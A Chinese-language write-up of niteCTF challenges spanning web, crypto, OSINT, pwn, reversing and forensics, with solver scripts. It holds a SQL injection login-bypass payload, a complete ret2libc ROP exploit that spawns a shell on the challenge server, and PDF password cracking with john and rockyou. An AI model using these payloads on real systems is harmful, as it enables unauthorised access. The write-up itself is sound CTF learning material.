# niteCTF
###### tags: `CTF`

## Web
### 4dm1n_c0ntR0L
![](https://i.imgur.com/ULgUutE.png)

連進去後是一個登入介面

![](https://i.imgur.com/6zcw7v3.png =400x)

嘗試 sql injection

```
' or 1=1 -- #
```

得到 `Get Flag` 按鈕

![](https://i.imgur.com/thQoquv.png)

按下去拿 flag

![](https://i.imgur.com/rsp7EH6.png)

nitectf{w3nT_1nT0_Th3_s3rV3r}

### Phpbasics
![](https://i.imgur.com/xVZOOvN.png)

hint:
![](https://i.imgur.com/T7TZAaQ.png)

從提示中可以看到，是跟 php 與 sql 的 float datatype 之間的差異問題的漏洞

一進入網頁中，可以看到只有一個顯示 id 的欄位

![](https://i.imgur.com/5P7aXXT.png)

嘗試加一個 id 的 payload，並隨便設定，但發現只有 id 為 142 時會出現 `Invalid id (142).` 的訊息

![](https://i.imgur.com/obdClKC.png)

而關於 float 的問題中，可能會有 precision 的問題，而在測試時發現 php 為單精度而搜尋一下發現 sql 好像是雙精度的部分

因此，在輸入 `id=142.0000000000001` 這種數時，就會出現因精度差異導致的不一致，而也順利拿到 flag

![](https://i.imgur.com/0Kb2AxQ.png)

nitectf{u_cr4cK3d_Th3_pHp_c0d3}

## Crypto
### itsybitsyrsa
![](https://i.imgur.com/Oef793M.png)

從題目名稱可知跟 RSA 有關，題目給了 n, e, c 的值，沒有其他的了

觀察看看 e 或是 n 有沒有漏洞

```
e = 19 
```

e 看起來有點小，但一般來說還是沒辦法用暴力解出來

![](https://i.imgur.com/wpax5Es.png)

n 爆幹大，一定沒辦法用質因數分解

由於 n 爆幹大的原因，基本上可以猜到模數 n 沒有作用，即 $ct = pt^e$，因此只要用 iroot 解開即可

:::spoiler solve.py
```python=
from gmpy2 import iroot
from Crypto.Util.number import long_to_bytes

ciphertext = ...
e = 19

plaintext = iroot(ciphertext, 19)[0]

print(long_to_bytes(plaintext))
```
:::

nitectf{rsa_can_be_very_adaptable}

### Basically, I locked up
![](https://i.imgur.com/y8k0M64.png)

:::spoiler new_encryption.py
```python=
def new_encryption(file_name, password):
  with open(file_name, "rb") as f:
    plaintext = f.read()
  assert(len(password) == 8)
  assert(b"HiDeteXT" in plaintext)
  add_spice = lambda b: 0xff & ((b << 1) | (b >> 7))
  ciphertext = bytearray(add_spice(c) ^ ord(password[i % len(password)]) for i, c in enumerate(plaintext))
  with open(file_name + "_encrypted", "wb") as f:
    f.write(ciphertext)

def new_decryption(file_name, password):
  with open(file_name + "_encrypted", "rb") as f:
    ciphertext = f.read()
  remove_spice = lambda b: 0xff & ((b >> 1) | (b << 7))
  plaintext = bytearray(remove_spice(c ^ ord(password[i % len(password)])) for i, c in enumerate(ciphertext))
  with open(file_name + "_decrypted", "wb") as f:
    f.write(plaintext)

password = REDACTED

new_encryption("Important", password)
new_decryption("Important", password)
```
:::

從程式中可以看到，加密部分會先對 bit 層面做 shift 後進行 xor 加密，此外也可以得知 password 長度為 8 且 plaintext 中有 `HiDeteXT` 字串

因此我的策略是，先對已知的 `HiDeteXT` 字串做 shift 運算，並對一個一個 chunk 做 xor 運算並確認輸出是否為 printable 的字元，如果是的話就有可能是 password

:::spoiler solve.py
```python=
import string

wordset = string.ascii_letters + string.digits

with open("/home/ywc/myworkspace/nitectf/basically_I_locked_up/Important_encrypted", "rb") as f:
    plaintext = f.read()

add_spice = lambda b: 0xff & ((b << 1) | (b >> 7))
transform = bytes([add_spice(c) for _, c in enumerate(b"HiDeteXT")])

for offset in range(8):
    for i in range(offset, len(plaintext), 8):
        chunk = plaintext[i:i+8]
        xored = bytes([a^b for a,b in zip(chunk, transform)])
        if(all(chr(x) in string.printable for x in xored)):
            print("possible password:", xored)
            print(offset)
```
:::

找出來有可能的 password 中，最有可能的是 `XTHiDete` 這個，並根據 offset 調整後的 password 為 `HiDeteXT`

![](https://i.imgur.com/G3RMH2O.png)

丟進去原始程式並做解密後，得出以下明文

```
Oh, You Searching for HiDeteXT ??

NITE{BrUT3fORceD_y0uR_wAy_iN}
```

NITE{BrUT3fORceD_y0uR_wAy_iN}

### Shoo-in
![](https://i.imgur.com/L4ZkKzZ.png)

:::spoiler chall.py
```python=
import gmpy2
import secrets as s
from flag import flag

fn = open(r"firstnames.py", 'r')
ln = open(r"lastnames.py", 'r')
fp = open (r"primes.py", 'r')
fn_content = fn.readlines()
ln_content = ln.readlines()
prime_arr = fp.readlines()

class RNG:
    def __init__ (self, seed, a, b, p):
        self.seed = seed
        self.a = a
        self.b = b
        self.p = p

    def gen(self):
        out = self.seed
        while True:
            out = (self.a * out + self.b) % self.p
            self.a += 1
            self.b += 1
            self.p += 1
            yield out

def getPrime ():
    prime = int(prime_arr[next(gen)].strip())
    return prime

def generate_keys():
    p = getPrime()
    q = getPrime()
    n = p*q
    g = n+1
    l = (p-1)*(q-1)
    mu = gmpy2.invert(((p-1)*(q-1)), n)
    return (n, g, l, mu)

def pallier_encrypt(key, msg, rand):
    n_sqr = key[0]**2
    return (pow(key[1], msg, n_sqr)*pow(rand, key[0], n_sqr) ) % n_sqr

N=(min(len(fn_content), len(ln_content)))
seed, a, b = s.randbelow(N), s.randbelow(N), s.randbelow(N)
lcg = RNG(seed, a, b, N)
gen=lcg.gen()

for i in range (0, 10):
    if i==0:
        name1 = fn_content[a].strip()+" "+ln_content[b].strip()
    else:
        name1 = fn_content[next(gen)].strip()+" "+ln_content[next(gen)].strip()
    name2 = fn_content[next(gen)].strip()+" "+ln_content[next(gen)].strip()
    print (f"{name1}	vs	{name2}")
    
    winner=next(gen)%2
    inp = int(input ("Choose the winner: 1 or 2\n"))
    if (winner!=inp%2):
        print ("Sorry, you lost :(")
        break
    else:
        if (i<9):
            print ("That's correct, here is the next round\n")
        else:
            print ("Congratulations! you made it")
            print ("Can you decode this secret message?")
            key=generate_keys()
            print(pallier_encrypt(key, int.from_bytes(flag, "big"), next(gen)))
```
:::

可以看到裡面亂數部分使用修改過的 RNG 產生，而相關參數如 p, a, b 等可以根據輸出得出，基本上能夠完整預測每次的產生結果

而第二個難題是在猜完 10 次之後，會有 [Paillier](https://en.wikipedia.org/wiki/Paillier_cryptosystem) 的同態加密，不過由於可以預測，因此可以得出 p, q 參數，也就能夠拿到私鑰的 $\lambda$, $\mu$ 等參數，根據 wiki 的公式可以輕鬆的還原出 flag

以下是完整的 exploit

:::spoiler solve.py
```python=
from pwn import *
from Crypto.Util.number import long_to_bytes
import gmpy2
context.log_level = "debug"

class RNG:
    def __init__ (self, seed, a, b, p):
        self.seed = seed
        self.a = a
        self.b = b
        self.p = p

    def gen(self):
        out = self.seed
        while True:
            out = (self.a * out + self.b) % self.p
            self.a += 1
            self.b += 1
            self.p += 1
            yield out

with open("/home/ywc/myworkspace/nitectf/shoo_in/primes.py") as fh:
    prime_arr = fh.readlines()

def getPrime ():
    prime = int(prime_arr[next(gen)].strip())
    return prime

def generate_keys():
    p = getPrime()
    q = getPrime()
    n = p*q
    g = n+1
    l = (p-1)*(q-1)
    mu = gmpy2.invert(((p-1)*(q-1)), n)
    return (n, g, l, mu)

def pallier_decrypt(key, msg):
    n_sqr = key[0]**2
    return ((pow(msg, key[2], n_sqr) // key[0]) * key[3]) % key[0]

conn = remote("35.204.16.174", 1337)
conn.recvline()
# conn = process(["python", "chal.py"])

with open("/home/ywc/myworkspace/nitectf/shoo_in/firstnames.py") as fh:
    firstname = list(map(lambda x: x.strip(), fh.readlines()))
with open("/home/ywc/myworkspace/nitectf/shoo_in/lastnames.py") as fh:
    lastname = list(map(lambda x: x.strip(), fh.readlines()))

N=min(len(firstname), len(lastname))

name1 = conn.recvuntil(b"vs")[:-2].strip()
name2 = conn.recvline().strip()

a = firstname.index(name1.split(b" ")[0].strip().decode())
b = lastname.index(name1.split(b" ")[1].strip().decode())
newseed = firstname.index(name2.split(b" ")[0].strip().decode())

a += 1
b += 1
N += 1

print(f"a = {a} b = {b} newseed = {newseed} N = {N}")

lcg = RNG(newseed, a, b, N)
gen=lcg.gen()

next(gen)

for i in range(10):
    conn.sendlineafter(b"1 or 2\n", str(next(gen)%2).encode())
    if(i != 9):
        next(gen)
        next(gen)
        next(gen)
        next(gen)

conn.recvuntil(b"secret message?\n")
message = int(conn.recvline().decode())

print(message)

key = generate_keys()
flag = pallier_decrypt(key, message)
print(flag)
print(long_to_bytes(flag))

conn.interactive()
```
:::

niteCTF{n0T_sO_R@nd0m}

## Misc
### Boys
![](https://i.imgur.com/P6pHb8M.png)

在題目敘述中提到了 Github user `sk1nnywh1t3k1d`，看一下有什麼特別的東西

[Github](https://github.com/sk1nnywh1t3k1d)

可以看到，只有一個 repo，進去看看

![](https://i.imgur.com/3IvtAXg.png =400x)

有兩個 commit，看一下有沒有什麼洩漏的東西

![](https://i.imgur.com/eXqToCg.png)

在 second commit 中，發現刪除了一個檔案，diff 了一下發現檔案中有一個看起來是網址的東西

![](https://i.imgur.com/5UokE5U.png =400x)

[Link](https://bit.ly/voughtencrypted)

進去後是一個 mega，裡面有 secret_message.wav，看來挖到寶了

![](https://i.imgur.com/dnLeCH6.png =500x)

下載後用 audacity 並觀看波譜圖，看到像是文字的東西

![](https://i.imgur.com/rBIAOgH.png)

```
th9uovdne hsa1s drawrof y1 tod tib
```

看不懂，丟 dcode.fr 分析，看起來是相反寫的文字

![](https://i.imgur.com/Q0Bahl4.png)

解出來的文字如下
```
bit dot ly forward slash endvou9ht
```

看到 bit 和 ly，聯想到 bit.ly 短網址服務，嘗試存取資料

這邊發現不是 `endvou9ht` 而是 `endvought`

[Link](https://bit.ly/endvought)

點進去後又是一個 mega 連結，有 7_tower.jpg

![](https://i.imgur.com/51eopj7.png)

裡面有看起來很明顯的紅色東西，看起來有點像文字? 整體看起來像是拼圖?

嘗試將紅色字拼接起來，得出一個 email

![](https://i.imgur.com/msy0ao0.png)

```
HUGHIECAMPBELL392@GMAIL.COM
```

使用 osint 工具 epieos.com 搜尋看看，發現確實有一些資料

![](https://i.imgur.com/gSIww3u.png =500x)

慢慢確認後，發現在 google 日曆的地方有一個活動，標題就是 flag

![](https://i.imgur.com/AKODDFW.png)

niteCTF{v0ught_n33ds_t0_g0_d0wn}

### Travel
![](https://i.imgur.com/pU9k7V7.png)

給了一張圖片，使用 exiftool 看看

![](https://i.imgur.com/8mkfMu0.png =500x)

在 creater 的地方有網址ㄟ

[Link](https://bit.ly/mytodooolist)

進來之後是一個 Google Jamboard 的 todo list

![](https://i.imgur.com/CWWChW6.png =500x)

創建一個副本看看有沒有神奇的東西

把便條紙移開後，在左上角的地方看到又是一個網址

![](https://i.imgur.com/eRNqtwt.png)

[Link](https://tr4v3l1.netlify.app/)

點進來後是一個網站，沒有什麼特別的

![](https://i.imgur.com/KeIpvNd.png =500x)

看了一下 page source，發現有幾條奇怪的註解

![](https://i.imgur.com/5nwpfmj.png)

![](https://i.imgur.com/jX1OOHx.png)

第一個看起來像是 base64，拿去解碼後發現是 `flag.txt`，而也發現了 `/flag.txt` 的 endpoint，但是是一片空白

根據第二個提示，需要使用 wayback machine 或之類的網站來找網站歷史快照，而確實在 waybackmachine 中找到有 `/flag.txt` 的歷史紀錄

![](https://i.imgur.com/ZpMtTNd.png)

找到 flag

![](https://i.imgur.com/QLXiqS7.png)

nitectf{y0u_w3nt_b4ck_1n_t1m3}

## Pwn
### Toosmall
![](https://i.imgur.com/rHQgU8k.png)

首先將程式丟 ghidra，可以看到有很明顯的 BOF 漏洞

![](https://i.imgur.com/tRRyfES.png =400x)

在保護的部分，確實沒有 canary，不過有 PIE 和 NX

![](https://i.imgur.com/hwABEux.png =500x)

而在這個 binary 中沒有其他可疑函式了，如題目所說程式真的很小

由於以上的種種限制及特性，以及題目有給 libc 的情況下，可以推測這題是要 ret2libc with PIE

首先需要想辦法 leak 出 libc 的位置，在程式中可以觀察到會將輸入的部分用 `%s` 的 format 輸出，因此假設輸入內容後面沒有 `\x00` 就會一直印出 stack 的內容直到遇到此字元

觀察 stack 後，可以看到 return address (`0x7f5fc39e0d90`) 的部分就是 libc 的位置，因此只要輸入 0x18 個字元填滿前面的空間即可順便將 libc 中間位置印出，即可進一步獲得 libc base address

![](https://i.imgur.com/TXQtSZv.png =500x)

![](https://i.imgur.com/yIY5rFN.png =500x)

可是接下來就有一個問題，程式輸出之後就會結束了，沒辦法做更進一步的利用，此外也有 PIE 的因素，沒辦法得知 main 函式的位置

因此我觀察 libc 後，發現了一個利用點，以下是 libc 的 assembly code 和 decompile 的程式，原先的 return address 在 `0x00129d90` 綠色線處

![](https://i.imgur.com/ILBeXJg.png)

而很恰巧的是，往上二行的部分會將 rsp+8 位置的內容給 rax 並執行，而在 stack 中執行完 return 後的 rsp+8 內容剛好是 main 的位置，因此只要想辦法把位置改成 `0x7f5fc39e0d89` 就可以再次進入 main 函式了

另外由於 PIE 模式下位置的後三個 hex 不會變，因此可以用部分修改的方式覆蓋最後的 2 位 hex 改成 `0x89` 即可再此執行 main 函式

因此在有了 libc 位置的情況下，嘗試利用 libc 裡面的 gadget 組成 ROP chain，這邊我因為一直用手工方式找不到 gadget 所以利用 ROPgadget 工具的 `--ropchain` 選項自動產生 exploit 並稍微修改

以下是完整的 exploit

:::spoiler solve.py
```python=
from pwn import *
from Crypto.Util.number import bytes_to_long, long_to_bytes

binary = "./chall"

context.terminal = ["cmd.exe", "/c", "start", "bash.exe", "-c"]
context.log_level = "debug"
context.binary = binary

libc = ELF("./libc.so.6")

conn = remote("34.141.229.188",1337)
# conn = process(binary)
# conn = gdb.debug(binary)

payload = b"A"*0x10
payload += b"A"*0x8
payload += b"\x89" # 00129d89    MOV RAX ,qword ptr [RSP  + 0x8 ]
conn.sendafter(b"movie?: ", payload)
conn.recvuntil(b"like")
data = conn.recvline()[-8:-2]
print("leak:", data[::-1].hex())

libc_base = bytes_to_long(data[::-1]) + 0x57147 - libc.symbols["puts"]
print("libc base:", long_to_bytes(libc_base).hex())


payload = b"A"*0x10
payload += b"/bin/sh\x00"
payload += p64(libc_base + 0xa8b39) # mov rax, rbp ; pop rbp ; pop r12 ; pop r13 ; ret
payload += b"A"*0x18
payload += p64(libc_base + 0x90529) # pop rdx ; pop rbx ; ret
payload += p64(libc_base + 0x2191e0) # @ .data
payload += b"A"*0x8
payload += p64(libc_base + 0x3a410) # mov qword ptr [rdx], rax ; ret
payload += p64(libc_base + 0x2a3e5) # pop rdi ; ret
payload += p64(libc_base + 0x2191e0) # @ .data
payload += p64(libc_base + 0x2be51) # pop rsi ; ret
payload += p64(libc_base + 0x2191e8) # @ .data+8
payload += p64(libc_base + 0x108b13) # pop rdx ; pop rcx ; pop rbx ; ret
payload += p64(libc_base + 0x2191e8) # @ .data+8
payload += p64(libc_base + 0x2191e8) # @ .data+8
payload += p64(libc_base + 0x2191e8) # @ .data+8
payload += p64(libc_base + 0xbab79) # xor rax, rax ; ret
payload += p64(libc_base + 0x3a410) # mov qword ptr [rdx], rax ; ret
payload += p64(libc_base + 0xeb0f4) # mov eax, 0x3b ; syscall
conn.sendafter(b"movie?: ", payload)

conn.interactive()
```
:::

成功獲得 RCE 後，找尋了一下，在 `/flag` 檔案中拿到 flag

![](https://i.imgur.com/3M6WlNV.png =500x)

nite{wh3n_h3_s41d_1tS_r0pp1n_t1me_1_cr13d}

## rev
### undodge
![](https://i.imgur.com/Wk9FMWn.png)

載下來之後，發現是 unity 的遊戲

參考[這篇文章](https://www.kodeco.com/36285673-how-to-reverse-engineer-a-unity-game)，進行逆向分析

發現裡面有一些叫做 Flagchar 的物件，並且會在玩家獲得特定分數後輸出一些文字，推測可能是 flag

![](https://i.imgur.com/8p31srg.png)

寫了一個程式進行輸出

:::spoiler solve.py
```python=
import string
ab = string.ascii_lowercase + "_"
x = [26, 22, 7, 0, 19, 26, 0, 26, 15, 11, 0, 24, 4, 17, 26, 26]
print("".join([ab[xx] for xx in x]))
```
:::

輸出為 `_what_a_player__`，包成 flag 格式即可

`niteCTF{_what_a_player__}`

## forensics
### Wonka-Bar
![](https://i.imgur.com/ce7W2ql.png)

給了一個 pdf，但是發現需要密碼

![](https://i.imgur.com/RXkb5ec.png)

嘗試使用 pdf2john 加上 john 和 rockyou.txt 破解

![](https://i.imgur.com/lVJFOA9.png =500x)

解出來的密碼是 `13euro`，輸入後獲得一個網址及看起來是密碼的東西

![](https://i.imgur.com/Xydb8qh.png)

[Link](https://bit.ly/w0nkabar)

裡面是一個 zip，且又要密碼

![](https://i.imgur.com/3b98ax0.png)

![](https://i.imgur.com/XmsKnAm.png =500x)

根據 pdf 中文字加粗的提示，看起來像是密鑰或是其他的東西，最後使用 vigenere cipher 找出密碼為 `luckstrikes`

解開後發現裡面似乎是 3d 模型檔案，嘗試丟到 blender 看看

![](https://i.imgur.com/79TD7r9.png)

是一塊巧克力

![](https://i.imgur.com/637OlMV.png)


翻來覆去找不到接下來的提示，嘗試拉近看看裡面結構，發現似乎有文字

![](https://i.imgur.com/5pcXefp.png)

直接用編輯模式把表面拆開，得到一串網址

![](https://i.imgur.com/W1D5byv.png)

[Link](https://bit.ly/g01d3nt1ck3t)

又是一個他媽的檔案

![](https://i.imgur.com/IH4dl54.png)

載下來後用 exiftool 看，發現有 comment，需要解數學式以及有一個奇怪的文字

![](https://i.imgur.com/RySauPN.png)

很明顯的答案是 5 和 13，連國中生都會算，根據提示取最小的數字 5

猜測中間的部分是密文，5 是金鑰，可能是 caesar 之類的?

![](https://i.imgur.com/WDYCSez.png)

TADA，出來了

![](https://i.imgur.com/iUEjaC2.png =400x)

包成 flag 格式即可

niteCTF{3arth_says_h3ll0}

### (X) Revisiting Classsics
![](https://i.imgur.com/CXdf1fX.png)

幹差 15 分鐘解出來

題目給了一個 pcap 封包檔案，丟到 wireshark 分析

首先先看 protocol hierarchy，發現中間有很多 data 資料

![](https://i.imgur.com/pD1IeMM.png)

用 data 做為 filter，觀察資料區段後發現有一些有趣的字串

封包 5
![](https://i.imgur.com/fZLq7Hg.png)

封包 8
![](https://i.imgur.com/pgYCA45.png)

封包 16
![](https://i.imgur.com/XrrAY9H.png)

可以看到，這似乎是 minecraft 的相關 protocol，並使用 RSCube 作為 server

慶幸的是 [RSCube](https://github.com/Skryptonyte/RSCube) 有開源且在 Github 上找的到，可以進一步利用開源資料分析 protocol，另外也可以參考[這篇資料](https://www.grahamedgecombe.com/talks/minecraft.pdf)了解相關資訊

裡面比較重點的是，在封包資料開頭部分會有一個 opcode 代表正在做什麼事情，接著就是相關參數的部分，以下是一些在此問題中有出現到且有用的 opcode 和參數

|    direction     | opcode |                                          params                                          |    description     |
|:----------------:|:------:|:----------------------------------------------------------------------------------------:|:------------------:|
| client -> server | 08 ff  | x (2 bytes)<br /> y (2 bytes)<br /> z (2 bytes)<br /> yaw (1 byte)<br /> pitch (1 byte)  | 玩家位置及觀看方向 |
| client -> server |   00   |             version (1 byte) <br /> username<br /> mppass (start from 0x66)              |   玩家登入伺服器   |
| client -> server | 0d ff  |                                           msg                                            |    玩家打字聊天    |
| server -> client |   0d   |                                userID (1 byte) <br /> msg                                |  推播玩家聊天內容  |
| client -> server |   05   | x (2 bytes)<br /> y (2 bytes)<br /> z (2 bytes)<br /> ?? (1 byte)<br /> blockID (1 byte) |      放置方塊      |
| server -> client |   06   |          x (2 bytes)<br /> y (2 bytes)<br /> z (2 bytes)<br /> blockID (1 byte)          |    推播方塊變更    |

在封包中，僅有一個玩家 Nite 登入伺服器，另外在經過觀察後發現該玩家有進行聊天並傳送部分 flag 資訊

:::spoiler script.py
```python=
import pyshark
from Crypto.Util.number import bytes_to_long
import matplotlib.pyplot as plt

cap = pyshark.FileCapture('./newcaptures.pcap', display_filter="data")

for packet in cap:
    data = bytes.fromhex(packet.DATA.data)
    if b"Nite" in data:
        print(data)
```
:::

![](https://i.imgur.com/803ryIh.png)

但發現中間似乎少了一段，因此在繼續查看封包相關內容發現玩家有進行放置物品的動作，因此推測可能有使用方塊拼成文字的部分

以下是改寫後的 script

:::spoiler solve.py
```python=
import pyshark
from Crypto.Util.number import bytes_to_long
import matplotlib.pyplot as plt

cap = pyshark.FileCapture('./newcaptures.pcap', display_filter="data")

walkpath = []
block = dict()
typeset = set()

for packet in cap:
    data = bytes.fromhex(packet.DATA.data)
    if data[0:1] == b"\x06":
        # set block packet
        x = bytes_to_long(data[1:3])
        y = bytes_to_long(data[3:5])
        z = bytes_to_long(data[5:7])
        type = bytes_to_long(data[7:8])
        if x not in block.keys():
            block[x] = dict()
        if y not in block[x].keys():
            block[x][y] = dict()
        if z not in block[x][y].keys():
            block[x][y][z] = dict()
        block[x][y][z] = type
        typeset.add(type)
    if b"Nite" in data:
        print(data)

fig = plt.figure()
ax = plt.axes(projection ='3d')
for type in typeset:
    if type == 0:
        continue
    xx = []
    yy = []
    zz = []
    for x in block:
        for y in block[x]:
            for z in block[x][y]:
                if(block[x][y][z] == type):
                    xx.append(x)
                    yy.append(y)
                    zz.append(z)
    ax.scatter(xx, yy, zz)
plt.show()
```
:::

由於有發現物品 ID 為 0 的東西 (即空氣方塊，詳見[mc wiki](https://minecraft.fandom.com/zh/wiki/Java版数据值/扁平化前/方块ID?variant=zh-tw))，因此需要將此方塊去除不渲染，以下是輸出結果

![](https://i.imgur.com/9SUjyKp.png)

中間部分經過測試之後，發現文字為 `an4lys1s`

組合起來就是 flag

nite{cl4ssic_an4lys1s_120981}